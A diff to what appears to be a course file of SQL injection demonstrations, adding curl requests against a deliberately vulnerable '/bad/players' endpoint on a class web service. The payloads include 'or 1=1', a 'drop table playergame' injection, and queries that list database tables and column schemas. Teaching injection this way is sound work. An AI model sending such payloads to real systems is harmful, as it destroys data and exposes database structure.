@@ -1,5 +1,7 @@
 -- SQL injection examples (only work when /bad/* endpoints are enabled)
 
+export SERVICE_URL=https://cs262-webservice-abebhtekgegdb2as.canadacentral-01.azurewebsites.net
+
 # URL: .../bad/players/1 or 1=1
 curl --request GET \
         ${SERVICE_URL}/bad/players/1%20or%201=1
@@ -13,4 +15,9 @@ curl --request GET \
         ${SERVICE_URL}/bad/players/1%3B%20drop%20table%20playergame
 
 # URL: .../bad/players/1; select * from pg_tables where tableowner = 'kvlinden';
+curl --request GET \
+        ${SERVICE_URL}/bad/players/1%3B%20select%20*%20from%20pg_tables%20where%20tableowner%3D%27kvlinden%27
+
 # URL: .../bad/players/1; select table_name,column_name,data_type from information_schema.columns where table_name='player';
+curl --request GET \
+        ${SERVICE_URL}/bad/players/1%3B%20select%20table_name,column_name,data_type%20from%20information_schema.columns%20where%20table_name%3D%27player%27
